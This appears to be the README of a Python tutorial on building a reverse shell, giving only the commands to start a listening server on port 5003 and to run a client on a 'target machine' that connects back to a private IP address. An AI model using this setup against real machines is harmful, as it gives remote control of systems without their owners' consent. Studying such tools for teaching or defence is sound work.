# [How to Create a Reverse Shell in Python](https://www.thepythoncode.com/article/create-reverse-shell-python)
You don't need to install anything.
- To run the server, simply write:
    ```
    python server.py
    ```
    **Output:**
    ```
    Listening as 0.0.0.0:5003 ...
    ```
- Running the client (target machine) that connects to 192.168.1.104 (server's IP Address) :
    ```
    python client.py 192.168.1.104
    ```
- The server will get notified once a client is connected.
